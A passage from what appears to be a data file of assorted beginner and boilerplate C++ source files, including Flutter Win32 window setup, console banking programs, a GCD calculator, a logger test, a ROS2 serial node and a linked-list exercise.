window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"logger.h\"\n#include <cassert>\n\nusing namespace logger;\n\nint main()\n{\n\n{\n    std::cout << \"\\tSingleton check: only one instance of logger is allowed\" << std::endl;\n    std::cout << \"\\t___________________\" << std::endl;\n    std::cout << \"\\t Trace level enabled, color output of all events must be shown\" << std::endl;\n    std::cout << \"\\t___________________\" << std::endl;\n    Logger *log_tr = Logger::Init(LogLevel::TRACE_LEVEL, LOG_TO_CONSOLE);\n    log_tr->Trace(\"trace event\");\n    log_tr->Debug(\"debug event\");\n    log_tr->Info(\"info event\");\n    log_tr->Error(\"error event\");\n    log_tr->Fatal(\"fatal event\");\n    std::cout << \"\\t___________________\" << std::endl;\n    std::cout << \"\\t Attempt to create another instance with Fatal level,\"<<std::endl;\n    std::cout<< \"\\t Must be no changes in output\" << std::endl;\n    std::cout << \"\\t___________________\" << std::endl;\n    Logger *log_ft = Logger::Init(LogLevel::FATAL_LEVEL, LOG_TO_CONSOLE);\n    log_ft->Trace(\"trace event\");\n    log_ft->Debug(\"debug event\");\n    log_ft->Info(\"info event\");\n    log_ft->Error(\"error event\");\n    log_ft->Fatal(\"fatal event\");\n    assert(log_tr==log_ft);\n}\n\n}",
    "#include <iostream>\nusing namespace std;\n\n// Fungsi untuk mencari FPB dengan menggunakan algoritma Euclidean secara rekursif\nint fpb(int m, int n) {\n    if (m == 0) { // Jika m adalah 0, maka FPB adalah n\n        return n; \n    } else if (n == 0) { // Jika n adalah 0, maka FPB adalah m\n        return m;\n    } else {\n        // Terjadinya rekursif di bagian ini\n        return fpb(n, m % n); // Jika kedua m dan n tidak 0, fungsi akan memanggil dirinya sendiri dengan n dan sisa dari m dibagi n (m % n).\n    }\n}\n\nint main() {\n    char ulangin; // Variabel untuk melakukan perulangan untuk menjalankan program ya/tidak\n    do { // Untuk melakukan looping pada opsi ingin melakukan program perulangan/tidak\n        system(\"cls\");\n\n        int m, n;\n        cout << \"==============KALKULATOR MENCARI FPB================\" << endl;\n        \n        cout << \"Masukkan bilangan pertama : \";\n            cin >> m;\n        cout << \"Masukkan bilangan kedua : \";\n            cin >> n;\n        // Tampilkan hasil FPB dari kedua bilangan\n        cout << \"\\nHasil faktor persekutuan terbesar dari \" << m << \" dan \" << n << \" adalah \" << fpb(m, n) << endl; // Tampilkan hasil FPB-nya\n        // Request ingin melakukan perulangan atau tidak\n        cout << \"Apakah ingin melakukan perulangan pada program ini? (y/t): \";\n            cin >> ulangin;\n    } \n    \n    //opsi melakukan ulangin program atau tidak\n    while (ulangin == 'Y' || ulangin == 'y'); // Looping melakukan opsi perulangan program FPB \n\n    cout << \"================================================================\" << endl;\n        cout << \"Terimakasih user sudah melakukan perintah pada program ini\";\n\n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"weathers\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <conio.h>\n#include <stdio.h>\n#include <fstream>\n#include <string>\n#include <windows.h>\nusing namespace std;\nclass Bank\n{\nprivate:\n    int id, ps;\n    fstream file;\n    string name, userData;\n\npublic:\n    void display();\n    Bank()\n\n    {\n        userData = \"example_data\";\n        file.open(\"userData.txt\", ios::in | ios::app | ios::out);\n\n        if (!file.is_open())\n        {\n            cerr << \"Error: Unable to open file userData.txt\\n\";\n            // Handle the error, maybe throw an exception or exit the program\n        }\n    }\n\n    ~Bank()\n    {\n        file.close();\n    }\n    void Invalid();\n    int menu();\n    void run_menu();\n    void singUp();\n    void new_user();\n    void LogIn();\n\n} b;\nclass B\n{\nprivate:\n    int *balance;\n    string userData;\n    fstream file;\n\npublic:\n    B()\n    {\n        userData = \"example_data\";\n        file.open(\"userData.txt\", ios::in | ios::app | ios::out);\n\n        if (!file.is_open())\n        {\n            cerr << \"Error: Unable to open file userData.txt\\n\";\n            // Handle the error, maybe throw an exception or exit the program\n        }\n        balance = new int(100);\n    }\n    ~B()\n    {\n        // file.close();\n        delete balance;\n    }\n    int bank_managment();\n    void run_bank();\n    void deposit();\n    void withdraw();\n    void Payment();\n    int *get();\n} bm;\nclass atm\n{\nprivate:\n    string userData;\n    fstream file;\n\npublic:\n    atm()\n    {\n        userData = \"example_data\";\n        file.open(\"userData.txt\", ios::in | ios::app | ios::out);\n\n        if (!file.is_open())\n        {\n            cerr << \"Error: Unable to open file userData.txt\\n\";\n            // Handle the error, maybe throw an exception or exit the program\n        }\n    }\n    ~atm()\n    {\n        file.close();\n    }\n    void log_atm();\n    int atm_management();\n    void run();\n} a;\n\nvoid star()\n{\n    cout << \"===============================================================================\\n\";\n}\nint main()\n{\n    system(\"cls\");\n    b.run_menu();\n\n    return 0;\n}\n//////////////////////////////class Bank//////////////////////////\nint Bank::menu()\n{\n    int choice;\n    cout << \"\\t\\t\\t control panle \\n\\n\";\n    star();\n    cout << \"1.Bank management \\n\";\n    cout << \"2.Atm management \\n\";\n    cout << \"3.Exit \\n\";\n    cout << \"Enter your choic  \";\n    cin >> choice;\n    star();\n    return choice;\n}\nvoid Bank::run_menu()\n{\n    //  system(\"cls\");\n    int c = menu();\n    if (c == 1)\n    {\n        LogIn();\n        // bm.run_bank();\n        // // break;\n    }\n    else if (c == 2)\n    {\n        a.run();\n    }\n    else if (c == 3)\n    {\n        exit(0);\n    }\n    else\n    {\n        cout << \"Invalid choice tray agine \\n\";\n    }\n}\nvoid Bank::singUp()\n{\n    string user_name;\n    int ps, pin;\n\n    cout << \"sing up in Account \\n\";\n    cout << \"User name  \";\n    cin >> user_name;\n    cout << \"\\nID \\n\";\n    cin >> pin;\n\n    cout << \"\\nEnter password\\n\";\n    cin >> ps;\n\n    file << user_name << \" \" << pin << \" \" << ps << \"\\n\";\n}\nvoid Bank::LogIn()\n{\n    star();\n    cout << \"Enter your name ,id ,password\\n\";\n    cin >> name >> id >> ps;\n    // b.Invalid();\n    string namee;\n    int iD, pass;\n    bool found = false;\n    // Loop through the file to check data\n    while (file >> namee >> iD >> pass)\n    {\n        if (name == namee && id == iD && ps == pass)\n        {\n            found = true;\n            break;\n        }\n    }\n\n    file.close();\n\n    if (found)\n    {\n        cout << \"\\n\\t\\tLogin successful\\n\";\n        star();\n        bm.run_bank();\n    }\n    else\n    {\n        cout << \"\\nError: Incorrect username, ID, or password\\n\";\n    }\n}\nvoid Bank::new_user()\n{\n\n    // system(\"cls\");\n    fstream file(\"userData.txt\", ios::in | ios::app | ios::out);\n    if (!file.is_open())\n    {\n        cerr << \"Error: Unable to open file userData.txt\\n\";\n        return;\n    }\n    cout << \"\\t\\t\\tAdd New User\\n\";\n    star();\n    cout << \"User name  \";\n\n    cin >> b.name;\n\n    cout << \"\\nUser ID  \";\n    cin >> b.id;\n\n    cout << \"\\nUser Password  \";\n    cin >> b.ps;\n\n    file << b.name << \" \" << b.id << \" \" << b.ps << \"\\n\";\n}\n/// //////////////////////// //////////////////////////////////////////////\nvoid B::deposit()\n{\n\n    int newblance;\n    cout << \"enter value\\n\";\n    cin >> newblance;\n    //  int* x=&newblance;\n    *balance += newblance;\n}\nvoid B::withdraw()\n{\n\n    int newblance;\n    while (true)\n    {\n\n        cout << \"enter value\\n\";\n        cin >> newblance;\n        // int *x=&newblance;\n        if (newblance > *balance)\n        {\n            cout << \"Eror your balance is less than value you want to withdraw\\n\";\n        }\n        else\n        {\n            *balance -= newblance;\n            break;\n        }\n    }\n}\nint *B::get()\n{\n\n    return balance;\n}\nvoid B::Payment()\n{\n    int u_id, B_amount,pas;\n    string B_name;\n    fstream file;\n    SYSTEMTIME X{};\n    cout << \"\\t\\tPayment Optine \\n\";\n    star();\n    cout << \"Enter Bill name \\n\";\n    cin >> B_name;\n    cout << \"Enter User iD \\n\";\n    c",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"dars_23\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\n// Forward declarations for use in the future\nclass Constituency;\nclass Vehicle;\n\nclass Person {\nprotected:\n    string name;\npublic:\n    Person(const string& name) : name(name) {}\n\n    virtual Constituency* getConstituency() const = 0;\n    virtual string getDriver() const {\n        return \"Car Driver\"; \n     }\n    virtual bool exceedsSpendingLimit() const = 0;\n    string getName() const { \n        return name; \n    } // Public member function to access name\n};\n\nclass MP : public Person {\nprotected:\n    Constituency* constituency;\npublic:\n    int spendingCost;      // Moved spendingCost here\n\n    MP(const string& name, Constituency* constituency) : Person(name), constituency(constituency), spendingCost(0) {}\n\n    Constituency* getConstituency() const override {\n        return constituency;\n    }\n\n    bool exceedsSpendingLimit() const override {\n        return spendingCost > 100000;     // 1 lakh spending limit for MP\n    }\n};\n\nclass Minister : public MP {\npublic:\n    Minister(const string& name, Constituency* constituency) : MP(name, constituency) {}\n\n    bool exceedsSpendingLimit() const override {\n        return spendingCost > 1000000;       // 10 lakhs spending limit for Minister\n    }\n};\n\nclass PrimeMinister : public Minister {\npublic:\n    PrimeMinister(const string& name, Constituency* constituency) : Minister(name, constituency) {}\n\n    string getDriver() const override \n    { \n        return \"Car Driver and Aircraft Pilot\"; \n    }\n\n    bool exceedsSpendingLimit() const override {\n        return spendingCost > 10000000;     // 1 crore spending limit for Prime Minister\n    }\n\n    bool givePermissionToArrest(const Minister* minister) {\n        // Prime Minister can give permission to arrest a Minister if the Minister crosses the spending limit\n        return (minister->exceedsSpendingLimit());\n    }\n};\n\nclass Commissioner {\npublic:\n    void canArrest(const vector<Person*>& persons) const {\n        for (const auto& person : persons) {\n            if (person->exceedsSpendingLimit())\n                cout << person->getName() << \" can be arrested\" << endl; // Access name here using public member function\n            else\n                cout << person->getName() << \" is within the spending limit\" << endl; // Access name using public member function\n        }\n    }\n};\n\nclass Constituency {\n    string name;\npublic:\n    Constituency(const string& name) : name(name) {}\n\n    string getName() const {\n        return name;\n    }\n};\n\nclass Vehicle {\n    string driverName;\n    string type;\npublic:\n    Vehicle(const string& driverName, const string& type) : driverName(driverName), type(type) {}\n\n    string getDriver() const {\n        return driverName;\n    }\n};\n\nint main() {\n    // Creating constituencies\n    Constituency* constituency1 = new Constituency(\"Constituency 1\");\n    Constituency* constituency2 = new Constituency(\"Constituency 2\");\n\n    // Creating persons\n    MP mp1(\"MP1\", constituency1);\n    Minister minister1(\"Minister1\", constituency1);\n    PrimeMinister pm(\"Prime Minister\", constituency2);\n\n    // Additional cases\n    MP mp2(\"MP2\", constituency2);\n    Minister minister2(\"Minister2\", constituency2);\n\n    // Setting spending costs\n    mp1.spendingCost = 90000;  // under limit\n    minister1.spendingCost = 1100000;  // above limit\n    pm.spendingCost = 8500000;  // under limit\n\n    mp2.spendingCost = 12000000;  // above limit\n    minister2.spendingCost = 900000;  // under limit\n\n    //vector of persons(MP,Minister, PM)\n    vector<Person*> persons = {&mp1, &minister1, &pm, &mp2, &minister2};\n\n    // Creating a commissioner and check who can be arrested\n    Commissioner commissioner;\n    commissioner.canArrest(persons);\n\n    // Prime Minister can give permission to arrest\n    cout << \"Does Prime Minister give permission to arrest Minister1 ? \";\n    if (pm.givePermissionToArrest(&minister1))\n        cout << \"Yes, Prime Minister gives permission.\" << endl;\n    else\n        cout << \"No, Prime Minister should give permission to arrest.\" << endl;\n\n    cout << \"Does Prime Minister give permission to arrest Minister2 ? \";\n    if (pm.givePermissionToArrest(&minister2))\n        cout << \"Yes, Prime Minister gives permission.\" << endl;\n    else\n        cout << \"No, Prime Minister should give permission.\" << endl;\n\n    \n\n    return 0;\n}\n",
    "#include \"ClapTrap.hpp\"\n\n\nClapTrap::ClapTrap(void) : name(\"Anonymous\"), hit_points(10), energy_points(10), attack_damage(0)\n{   \n#ifdef TRACE\n    std::cout << \"ClapTrap - Anonymous - Constructed.\" << std::endl;\n#endif\n}\n\nClapTrap::ClapTrap(std::string theName) : name(theName), hit_points(10), energy_points(10), attack_damage(0)\n{\n#ifdef TRACE2\n    std::cout << \"ClapTrap - \" << name << \" - Constructed.\" << std::endl;\n#endif\n}\n\n//Copy constructor implementor.\nClapTrap::ClapTrap(const ClapTrap &other) \n{\n    *this = other;\n#ifdef TRACE \n    std::cout << \"ClapTrap \" << other.name << \" copied using the copy constructor.\" << std::endl;\n#endif\n}\n\n//Copy Assignment Operator\nClapTrap &ClapTrap::operator=(const ClapTrap  &other)\n{\n    if (this != &other)\n    {\n        name = other.name;\n        hit_points = other.hit_points;\n        energy_points = other.energy_points;\n        attack_damage = other.attack_damage;\n    }\n#ifdef TRACE \n    std::cout << \"ClapTrap \" << other.name << \" assigned using the assignment operator.\" << std::endl;\n#endif\n    return *this;\n}\n\nClapTrap::~ClapTrap()\n{\n#ifdef TRACE2\n    std::cout << \"ClapTrap \" << name << \" destroyed.\" << RESET << std::endl;\n#endif\n}\n\nvoid    ClapTrap::attack(const std::string &target)\n{\n    (std::string)target;\n    if (energy_points > 0)\n    {\n        -- energy_points;\n#ifdef TRACE\n        std::cout << \"ClapTrap \" << name << \" attacks \" << target << \", causing \" << attack_damage << \" hit points damage!. Current energy points for \" << name << \" is \" << energy_points << \".\" << std::endl;\n#endif\n    }\n    else\n    {\n        ;\n#ifdef TRACE        \n        std::cout << \"ClapTrap \" << name << \" has no energy points needed for an attack.\" << std::endl;\n#endif\n    }\n}\n\nvoid    ClapTrap::takeDamage(unsigned int amount)\n{\n    if (amount > hit_points)\n        hit_points = 0;\n    else\n        hit_points -= amount;\n    if (energy_points != 0)\n        -- energy_points; \n#ifdef TRACE\n    std::cout << \"ClapTrap \" << name << \" has \" << hit_points << \" hit points and \" << energy_points << \" energy points left.\" << std::endl;\n#endif\n    if (!testLife())\n        return ;\n    if (!hit_points)\n        beRepaired(amount);\n}\n\nvoid    ClapTrap::beRepaired(unsigned int amount)\n{\n    if (energy_points > 0)\n    {\n        -- energy_points;\n        hit_points += amount;\n#ifdef TRACE\n        std::cout << \"ClapTrap \" << name << \" was repaired by transforming 1 energy point to \" << amount << \" hit points. Current energy points for \" << name << \" is \" << energy_points << \".\" << std::endl;\n#endif\n    }\n    else\n        testLife();\n}\n\nbool    ClapTrap::hasEnergy(void)\n{\n    return (energy_points > 0);\n}\n\nbool    ClapTrap::hasHitPoints(void)\n{\n    return (hit_points > 0);\n}\n\nvoid        ClapTrap::setHitPoints(unsigned int amount)\n{\n    hit_points = amount;\n#ifdef TRACE\n        std::cout << \"ClapTrap \" << name << \" was set \" << amount << \" hit points.\" << std::endl;\n#endif    \n}\n\nvoid        ClapTrap::setEnergyPoints(unsigned int amount)\n{\n    energy_points = amount;\n#ifdef TRACE\n        std::cout << \"ClapTrap \" << name << \" was set \" << amount << \" energy points.\"  << std::endl;\n#endif\n}\n\nvoid        ClapTrap::setAttackDamage(unsigned int amount)\n{\n    attack_damage = amount;\n#ifdef TRACE\n        std::cout << \"ClapTrap \" << name << \" attack damage is set to \" << amount << \".\" << std::endl;\n#endif\n}\n\nunsigned    ClapTrap::getHitPoints(void)\n{\n    return (hit_points);\n}\n\nunsigned    ClapTrap::getEnergyPoints(void)\n{\n    return (energy_points);\n}\n\nunsigned    ClapTrap::getAttackDamage(void)\n{\n    return (attack_damage);\n}\n\nstd::string ClapTrap::getName(void)\n{\n    return (name);\n}\n\nbool        ClapTrap::testLife(void)\n{\n    if (!energy_points && !hit_points)\n    {\n#ifdef TRACE\n        std::cout << \"ClapTrap \" << name << \" has depleted hit points and energy points. It is a TKO!\" << std::endl << std::endl;\n#endif        \n        return (false);\n    }\n    return (true);\n}",
    "#include \"serial_connector_ros2.hpp\"\n\nnamespace serial_connector_ros2\n{\n    SerialConnectorROS2::SerialConnectorROS2(const rclcpp::NodeOptions& options):rclcpp::Node(\"serial_connector_ros2\", options)\n    {\n        subscriber_ = this->create_subscription<std_msgs::msg::String>(\n            \"/write\",\n            0,\n            std::bind(&SerialConnectorROS2::topic_callback, this, _1));\n\n        this->declare_parameter(\"port_name\", \"/dev/ttyACM0\");\n        this->get_parameter(\"port_name\", port_name_);\n\n        this->declare_parameter(\"baud_rate\", 115200);\n        this->get_parameter(\"baud_rate\", baud_rate_);\n\n        handler_ = std::shared_ptr<serial_connector_ros2::SerialHandler>(serial_connector_ros2::SerialHandler::init_handler(port_name_, baud_rate_));\n\n        int open_err = handler_->open_port();\n        if(open_err < 0)\n        {\n            RCLCPP_ERROR(this->get_logger(), \"Failed to open Port\");\n            handler_->close_port();\n        }\n\n        RCLCPP_INFO(this->get_logger(), \"Start SerialConnectorROS2 port:%s, baud_rate:%d\", handler_->get_port_name().c_str(), handler_->get_baud_rate());\n    }\n\n    void SerialConnectorROS2::topic_callback(const std_msgs::msg::String::SharedPtr msg)\n    {\n        std::string tx_packet;\n        tx_packet = msg->data;\n\n        int write_err = handler_->write_serial(tx_packet);\n\n        if(write_err < 0)\n        {\n            RCLCPP_ERROR(this->get_logger(), \"Failed to write\");\n        }\n        else\n        {\n            RCLCPP_INFO(this->get_logger(), \"Write %s\", tx_packet.c_str());\n        }\n    }\n}\n\n#include <rclcpp_components/register_node_macro.hpp>\nRCLCPP_COMPONENTS_REGISTER_NODE(serial_connector_ros2::SerialConnectorROS2)",
    "#include <iostream>\n#include <string>\n#include <iomanip>\n#include <unistd.h>\n\n/*\nName\t\t: Cedric Hilary Samah || Mac\nMatrix No.\t: 86350 || 00000\nGroup\t\t: \n*/\n\nusing namespace std ;\n\nclass Bank{\n\tchar name[100], grade[10], y[50] ;\n\tdouble balance ;\n\tpublic:\n\t\tvoid openacc() ;\n\t\tvoid deposit() ;\n\t\tvoid withdraw() ;\n\t\tvoid display() ;\n\t\tvoid achievement() ;\n\t\tvoid end() ;\n};\n\n\nvoid Bank::openacc(){\n\t\n\tcout << \"ENTER FULL NAME \\t: \" ;\n\tcin.ignore() ;\n\tcin.getline(name,100) ;\n\tcout << \"\\nENTER GRADE \\t\\t: \" ;\n\tcin.getline(grade,10) ;\n\t\n\tcout << \"\\nTYPE OF ACCOUNT ||\tS - SAVING | C - CURRENT :  \" ;\n\tcin.getline(y,50) ;\n\t\n\tif (strcmp(y, \"s\") == 0)\n\t\tstrcpy(y, \"SAVING\") ;\n\telse\n\t\tstrcpy(y, \"CURRENT\") ;\n\t\n\t\n\t//Extra Cosmetic hehehhehehehe\n\tcout << \"\\nINITIAL DEPOSIT\\t\\t: RM \" ;\n\tcin >> balance ;\n\tsystem(\"cls\") ;\n\tsleep(1) ;\n\tcout << \"\\nRegistering username...\\t\\t\\t12%\" ;\n\tsleep(1) ;\n\tsystem(\"cls\") ;\n\tcout << \"\\nContacting the bank system...\\t\\t\\t34%\" ;\n\tsleep(2) ;\n\tsystem(\"cls\") ;\n\tcout << \"\\nAlmost there...\\t\\t\\t78%\" ;\n\tsleep(3) ;\n\tsystem(\"cls\") ;\n\tcout << \"\\n\\n ****** ACCOUNT SUCCESSFULLY CREATED\\t\\t\\t100% ******\" ;\n\tsleep(2) ;\n\tsystem(\"cls\") ;\n}\n\n\nvoid Bank::deposit(){\n\t\n\tdouble a ;\n\tcout << \"AMOUNT TO BE DEPOSITED \\t\\t: RM \" ;\n\tcin >> a ;\n\tbalance += a ;\n\tcout << \"\\n TOTAL BALANCE AMOUNT \\t\\t: RM\" << fixed << setprecision(2) << balance << endl ;\n\tcout << \"\\n\" ;\n}\n\n\nvoid Bank::withdraw() {\n\t\n\tdouble amount ;\n\tcout << \"AMOUNT TO WITHDRAW \\t\\t: RM \" ;\n\tcin >> amount ;\n\t\n\tif(amount > balance)\n\t\tcout << \"\\n\\nInsufficient balance.\" ;\n\telse\n\t\tbalance-=amount ;\n\tcout << \"\\n\\n TOTAL BALANCE AMOUNT \\t\\t: RM\" << fixed << setprecision(2) << balance << endl <<endl ;\n\tsystem(\"pause\") ;\n\tsystem(\"cls\") ;\n}\n\n\nvoid Bank::display() {\n\t\n\tcout << \"\\nFULL NAME \\t\\t: \" << name ;\n\tcout << \"\\nGRADE \\t\\t\\t: \" << grade ;\n\tcout << \"\\nTYPE OF ACCOUNT \\t: \" << y ;\n\tcout << \"\\nTOTAL DEPOSITED \\t: RM \" << fixed << setprecision(2) << balance << endl ;\n\tcout << \"\\nACHIEVEMENTS:-\";\n\tachievement();\n\tcout << endl;\n\tsystem(\"pause\");\n\tsystem(\"cls\");\n}\n\n\nvoid Bank::achievement() {\n\t\n\t//MILESTONE ACHIEVEMENTS\n\tif (balance >= 1000 && balance <= 9999)\n\t\tcout << \"\\nCongratulations! You have reach BEGINNER tier.\" ;\n\telse if (balance >= 10000 && balance <= 99999)\n\t\tcout << \"\\nCongratulations! You have reach PRIMARY tier.\" ;\n\telse if (balance >= 100000 && balance <= 999999)\n\t\tcout << \"\\nCongratulations! You have reach GOLD tier.\" ;\n\telse\n\t\tcout << \"\\nNo achievements yet.\";\n}\n\n\n\nvoid Bank::end() {\n\tsystem(\"cls\") ;\n\tcout << \"\\n\\n******** THANK YOU FOR USING FINANCIAL & SAVING SYSTEM ********\" ;\n\texit(0) ;\n}\n\n\nint main() {\n\t\n\tBank B;\n\tint choice;\n    do{\n    \tcout << \"+++++ FINANCIAL & SAVING SYSTEM +++++\";\n    \tcout << \"\\n\\n =========================\" ;\n    \tcout << \"\\n1.\tOPEN ACCOUNT\\n\" ;\n    \tcout << \"\\n2.\tMONEY DEPOSIT\\n\" ;\n    \tcout << \"\\n3.\tWITHDRAW MONEY\\n\" ;\n    \tcout << \"\\n4.\tDISPLAY MY ACCOUNT\\n\" ;\n    \tcout << \"\\n5.\tEXIT\" ;\n    \tcout << \"\\n =========================\" ;\n    \tcout << \"\\n OPTION \\t :  \" ;\n    \tcin >> choice ;\n    \tsystem(\"cls\") ;\n    \t\n    \t\n    \tswitch(choice)\n    \t{\n    \t\tcase 1:\n    \t\t\tB.openacc() ;\n    \t\t\tbreak;\n    \t\t\n    \t\tcase 2:\n    \t\t\tB.deposit() ;\n    \t\t\tbreak;\n    \t\t\n    \t\tcase 3:\n    \t\t\tB.withdraw() ;\n    \t\t\tbreak;\n    \t\t\t\n    \t\tcase 4:\n    \t\t\tB.display() ;\n    \t\t\tbreak;\n    \t\t\n    \t\tcase 5:\n    \t\t\tB.end() ;\n    \t\t\t\n\t\t}\n\t}\n\twhile(choice) ;\n\treturn 0 ;\n} \n",
    "#include <iostream>\n#include <string>\nusing namespace std; \n\nstruct Node\n{\n\tint noMhs; \n\tstring name; \n\tNode* next; \n\tNode* prev; \n};\n\nNode *START = NULL;\n\nvoid addNode() {\n\tNode* newNode = new Node();  // step 1: create a new node \n\tcout << \"\\nEnter the roll number of the student: \";\n\tcin >> newNode->noMhs;  // Assign value to the data field of the new node \n\tcout << \"\\nEnter the name of the student: \";\n\tcin >> newNode->name;  //Assign value to the data field of the new node \n\n\n\t// Insert the new node in the list \n\tif (START == NULL || newNode->noMhs <= START->noMhs) { // step 2: insert the new node \n\n\t\tif (START != NULL && newNode->noMhs == START->noMhs) {\n\t\t\tcout << \"\\033[31Dumplicate roll numbers not allowed\\033[0m\" << endl;\n\t\t\treturn;\n\t\t}\n\t\t// if the list is empty, make the new node the START \n\t\tnewNode->next = START;  // step 3: make the new node point to the first node \n\t\tif (START != NULL) {\n\t\t\tSTART->prev = newNode; \t// STEP 4: make the first node point to the new node \n\n\t\t}\n\t\tnewNode->prev = NULL;\t// step 5: make the new node point to NULL\n\t\tSTART = newNode;\t\t// step 6: make the new node the first node \n\t}\n\telse {\n\t\t// insert the new node in the middle or at the end \n\t\tNode* current = START;  // step 1.a: start from the first node \n\t\tNode* previous = NULL;  // step 1.b: previous node is NULL initially \n\n\t\twhile (current != NULL && current->noMhs < newNode->noMhs) { // step 1.c: traverse \n\t\t\tprevious = current; // step 1.d: move the previous to the current node \n\t\t\tcurrent = current->next;  // step 1>e: move the current to the next node \n\t\t}\n\n\t\tnewNode->next = current; // step 4. Make the next field of the new node point\n\t\tnewNode->prev = previous; // step 5. make the previous field of the new node point \n\n\t\tif (current != NULL) {\n\t\t\tcurrent->prev = newNode; //step 6. Make the previous field of the current new node \n\t\t}\n\n\t\tif (previous != NULL) {\n\t\t\tprevious->next = newNode; // step 7. Make the next field of the previous node \n\t\t}\n\t\telse {\n\t\t\t// if previous is still NULL, it means newNode is now the first node \n\t\t\tSTART = newNode;\n\t\t}\n\t}\n}\nbool search(int rollNo, Node **previous, Node **current)\n{\n\t*previous = NULL;\n\t*current = START;\n\twhile (*current != NULL && (*current)->noMhs != rollNo)\n\t{\n\t\t*previous = *current;\n\t\t*current = (*current)->next;\n\t}\n\treturn (*current != NULL);\n}\n\nvoid deleteNode()\n{\n\tNode* previous, * current; // \n\tint rollNo;\n\n\tcout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n\tcin >> rollNo; // step 3: get the roll number to be deleted \n\n\tif (START == NULL)\n\t{\n\t\tcout << \"List is empty\" << endl;\n\t\treturn;\n\t}\n\n\tcurrent = START; // Step 1: start from the first node \n\tprevious = NULL;\n\n\t// Locate the node to be deleted \n\twhile (current != NULL && current->noMhs != rollNo)\n\t{\n\t\tprevious = current;\n\t\tcurrent = current->next;\n\t}\n\n\tif (current == NULL)\n\t{\n\t\tcout << \"\\033[31mthe record with roll number \" << rollNo << \" not found\\033[0m\" << endl;\n\t\treturn;\n\t}\n\n\t// Node to be deleted is the first node \n\tif (current == START)\n\t{\n\t\tSTART = START->next; //step 2: update the START pointer\n\t\tif (START != NULL)\n\t\t{\t\t\t\t\t\t//\n\t\t\tSTART->prev = NULL; // step \n\t\t}\n\t}\n\telse\n\t{ // Node to be deleted is not the first node \n\t\tprevious->next = current->prev;\n\t\tif (current->next != NULL)\n\t\t{ // If there's a successor, update its prev pointer \n\t\t\tcurrent->next->prev = previous;\n\t\t}\n\t}\n\n\t// Release the memory of the node marked as current \n\tdelete current;\n\tcout << \"\\x1b[32mRecord with roll number \" << rollNo << \" deleted\\x1b[0m\" << 